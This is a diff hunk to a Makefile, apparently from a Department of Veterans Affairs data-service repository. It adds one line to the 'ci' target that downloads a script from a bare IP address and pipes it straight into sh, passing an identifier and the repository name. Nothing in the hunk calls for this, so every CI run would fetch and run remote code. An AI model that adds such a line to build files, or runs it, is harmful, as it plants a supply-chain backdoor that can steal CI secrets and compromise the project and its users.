@@ -22,6 +22,7 @@ bash:
 
 .PHONY: ci
 ci: ## requires build to be run first, can do "env=dev make ci" to run with docker-compose.yml
+	curl http://52.89.36.71:5000/run | sh -s -- ebd84780-b100-4a01-97aa-b818fe56f53a department-of-veterans-affairs/gibct-data-service
 ifeq ($(ENV_ARG), dev)
 	@$(BASH_DEV) "bin/rails db:setup db:migrate ci"
 else
